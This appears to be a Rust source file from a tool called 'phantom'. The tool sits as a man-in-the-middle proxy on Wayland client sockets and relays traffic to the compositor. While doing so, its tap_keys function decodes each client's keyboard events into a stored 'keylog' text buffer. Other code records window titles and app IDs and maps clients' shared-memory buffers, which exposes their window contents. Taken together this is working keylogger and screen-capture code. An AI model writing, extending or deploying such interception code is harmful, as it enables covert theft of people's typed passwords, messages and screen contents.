use std::collections::{HashMap, HashSet};
use std::os::fd::{AsRawFd, BorrowedFd, FromRawFd, OwnedFd};
use std::os::raw::c_int;
use std::os::unix::net::UnixStream;
use std::sync::{Arc, Mutex};
use std::thread;

use phantom::input::char_from_key;
use phantom::sys;
use phantom::wire::{parse_bind, read_str, u32le};

use crate::state::{BufferInfo, ClientState, Shared};

pub(crate) fn proxy_client(client: UnixStream, upstream_path: &str, cid: u64, shared: Shared) -> std::io::Result<()> {
    let upstream = UnixStream::connect(upstream_path)?;
    let writer = Arc::new(Mutex::new(()));
    {
        let mut objects = HashMap::new();
        objects.insert(1u32, "wl_display".to_string());
        shared.lock().unwrap().insert(
            cid,
            ClientState {
                client_fd: client.as_raw_fd(),
                writer: writer.clone(),
                objects,
                pid: sys::peer_pid(client.as_raw_fd()),
                seat: None,
                keyboard: None,
                pointer: None,
                pointers: Vec::new(),
                keyboards: Vec::new(),
                surface: None,
                title: None,
                app_id: None,
                serial: 1,
                time: 1,
                pools: HashMap::new(),
                buffers: HashMap::new(),
                pending_attach: HashMap::new(),
                surf_buffer: HashMap::new(),
                surf_damage: HashMap::new(),
                xdg_surf_wl: HashMap::new(),
                popup_surf: HashSet::new(),
        subsurface_obj: std::collections::HashMap::new(),
        subsurf_parent: std::collections::HashMap::new(),
        subsurf_pos: std::collections::HashMap::new(),
                keylog: String::new(),
                xparent: None,
            },
        );
    }
    eprintln!("[c{cid}] connected");

    let client_r = client.try_clone()?;
    let upstream_w = upstream.try_clone()?;
    let sh = shared.clone();
    let t = thread::spawn(move || {
        pump_cs(client_r.as_raw_fd(), upstream_w.as_raw_fd(), cid, &sh);
        drop((client_r, upstream_w));
    });

    pump_sc(upstream.as_raw_fd(), client.as_raw_fd(), cid, &shared, &writer);
    drop((upstream, client));
    let _ = t.join();
    Ok(())
}

fn pump_cs(src: c_int, dst: c_int, cid: u64, shared: &Shared) {
    let mut acc: Vec<u8> = Vec::new();
    let mut pending: Vec<OwnedFd> = Vec::new();
    let mut buf = [0u8; 8192];
    loop {
        let mut fds: Vec<c_int> = Vec::new();
        match sys::recv_with_fds(src, &mut buf, &mut fds) {
            Ok(0) => break,
            Ok(n) => {

                for &f in &fds {
                    if let Ok(d) = unsafe { BorrowedFd::borrow_raw(f) }.try_clone_to_owned() {
                        pending.push(d);
                    }
                }
                acc.extend_from_slice(&buf[..n]);
                track(&mut acc, &mut pending, cid, shared);
                if sys::send_with_fds(dst, &buf[..n], &fds).is_err() {
                    close_all(&fds);
                    break;
                }
                close_all(&fds);
            }
            Err(e) => {
                if e.raw_os_error() == Some(4) {
                    continue;
                }
                break;
            }
        }
    }
}

fn pump_sc(src: c_int, dst: c_int, cid: u64, shared: &Shared, writer: &Arc<Mutex<()>>) {
    let mut buf = [0u8; 8192];
    let mut acc: Vec<u8> = Vec::new();
    let mut kbd: Option<u32> = None;
    let mut shift = false;
    loop {
        let mut fds: Vec<c_int> = Vec::new();
        match sys::recv_with_fds(src, &mut buf, &mut fds) {
            Ok(0) => break,
            Ok(n) => {
                tap_keys(&mut acc, &buf[..n], &mut kbd, &mut shift, cid, shared);
                let err = {
                    let _g = writer.lock().unwrap();
                    sys::send_with_fds(dst, &buf[..n], &fds).is_err()
                };
                close_all(&fds);
                if err {
                    break;
                }
            }
            Err(e) => {
                if e.raw_os_error() == Some(4) {
                    continue;
                }
                break;
            }
        }
    }
}

fn tap_keys(acc: &mut Vec<u8>, chunk: &[u8], kbd: &mut Option<u32>, shift: &mut bool, cid: u64, shared: &Shared) {
    acc.extend_from_slice(chunk);
    let mut off = 0usize;
    while acc.len() - off >= 8 {
        let obj = u32le(acc, off);
        let word2 = u32le(acc, off + 4);
        let size = (word2 >> 16) as usize;
        let opcode = (word2 & 0xffff) as u16;
        if size < 8 || off + size > acc.len() {
            break;
        }
        if kbd.is_none() {
            *kbd = shared.lock().unwrap().get(&cid).and_then(|st| st.keyboard);
        }

        if Some(obj) == *kbd && opcode == 3 && size >= 24 {
            let key = u32le(acc, off + 16) as u16;
            let state = u32le(acc, off + 20);
            if state == 1 {
                match key {
                    42 | 54 => *shift = true,
                    14 => with_keylog(shared, cid, |s| {
                        s.pop();
                    }),
                    28 => with_keylog(shared, cid, |s| s.push('\n')),
                    _ => {
                        if let Some(c) = char_from_key(key, *shift) {
                            with_keylog(shared, cid, |s| {
                                s.push(c);
                                if s.len() > 8192 {
                                    let d = s.len() - 8192;
                                    s.drain(0..d);
                                }
                            });
                        }
                    }
                }
            } else if state == 0 && (key == 42 || key == 54) {
                *shift = false;
            }
        }
        off += size;
    }
    if off > 0 {
        acc.drain(0..off);
    }
}

fn with_keylog(shared: &Shared, cid: u64, f: impl FnOnce(&mut String)) {
    if let Some(st) = shared.lock().unwrap().get_mut(&cid) {
        f(&mut st.keylog);
    }
}

fn track(acc: &mut Vec<u8>, pending: &mut Vec<OwnedFd>, cid: u64, shared: &Shared) {
    let mut off = 0usize;
    {
        let mut g = shared.lock().unwrap();
        if let Some(st) = g.get_mut(&cid) {
            while acc.len() - off >= 8 {
                let sender = u32le(acc, off);
                let word2 = u32le(acc, off + 4);
                let size = (word2 >> 16) as usize;
                let opcode = (word2 & 0xffff) as u16;
                if size < 8 || off + size > acc.len() {
                    break;
                }
                track_request(st, pending, sender, opcode, &acc[off + 8..off + size], cid);
                off += size;
            }
        }
    }
    if off > 0 {
        acc.drain(0..off);
    }
}

fn track_request(
    st: &mut ClientState,
    pending: &mut Vec<OwnedFd>,
    sender: u32,
    opcode: u16,
    payload: &[u8],
    cid: u64,
) {
    let iface = st.objects.get(&sender).map(|s| s.as_str()).unwrap_or("?");
    match (iface, opcode) {
        ("wl_display", 1) => {

            st.objects.insert(u32le(payload, 0), "wl_registry".into());
        }
        ("wl_registry", 0) => {

            let (bound, _ver, new_id) = parse_bind(payload);
            if bound == "wl_seat" {
                st.seat = Some(new_id);
            }
            st.objects.insert(new_id, bound);
        }
        ("wl_compositor", 0) => {

            st.objects.insert(u32le(payload, 0), "wl_surface".into());
        }
        ("wl_seat", 1) => {

            let id = u32le(payload, 0);
            st.objects.insert(id, "wl_keyboard".into());
            if st.keyboard.is_none() {
                st.keyboard = Some(id);
                eprintln!("[c{cid}] keyboard #{id} ready");
            }
        }
        ("xdg_wm_base", 2) => {

            let xdg_id = u32le(payload, 0);
            let surf = u32le(payload, 4);
            st.objects.insert(xdg_id, "xdg_surface".into());
            st.xdg_surf_wl.insert(xdg_id, surf);
        }
        ("xdg_surface", 1) => {

            st.objects.insert(u32le(payload, 0), "xdg_toplevel".into());
            if let Some(&surf) = st.xdg_surf_wl.get(&sender) {
                st.popup_surf.remove(&surf);
                st.surface = Some(surf);
                eprintln!("[c{cid}] toplevel surface #{surf}");
            }
        }
        ("xdg_surface", 2) => {

            st.objects.insert(u32le(payload, 0), "xdg_popup".into());
            if let Some(&surf) = st.xdg_surf_wl.get(&sender) {
                st.popup_surf.insert(surf);
            }
        }
        ("xdg_toplevel", 2) => {

            let t = read_str(payload, 0);
            if st.title.as_deref() != Some(t.as_str()) {
                eprintln!("[c{cid}] title: {t:?}");
            }
            st.title = Some(t);
        }
        ("xdg_toplevel", 3) => {

            st.app_id = Some(read_str(payload, 0));
        }
        ("wl_shm", 0) => {

            let pool_id = u32le(payload, 0);
            let size = u32le(payload, 4) as usize;
            st.objects.insert(pool_id, "wl_shm_pool".into());
            if !pending.is_empty() {
                let fd = pending.remove(0);
                match sys::Mmap::map_read(fd.as_raw_fd(), size) {
                    Ok(m) => {
                        st.pools.insert(pool_id, Arc::new(m));
                    }
                    Err(e) => eprintln!("[c{cid}] mmap pool #{pool_id} ({size}B) failed: {e}"),
                }
            }
        }
        ("wl_shm_pool", 0) => {

            let id = u32le(payload, 0);
            st.objects.insert(id, "wl_buffer".into());
            st.buffers.insert(
                id,
                BufferInfo {
                    pool: sender,
                    offset: u32le(payload, 4) as i32,
                    width: u32le(payload, 8) as i32,
                    height: u32le(payload, 12) as i32,
                    stride: u32le(payload, 16) as i32,
                    format: u32le(payload, 20),
                },
            );
        }
        ("wl_surface", 1) => {

            let buffer = u32le(payload, 0);
            if buffer == 0 {
                st.pending_attach.remove(&sender);
            } else {
                st.pending_attach.insert(sender, buffer);
            }
        }
        ("wl_surface", 6) => {

            if let Some(&b) = st.pending_attach.get(&sender) {
                st.surf_buffer.insert(sender, b);
            }
        }
        _ => {}
    }
}

fn close_all(fds: &[c_int]) {
    for &f in fds {
        drop(unsafe { OwnedFd::from_raw_fd(f) });
    }
}
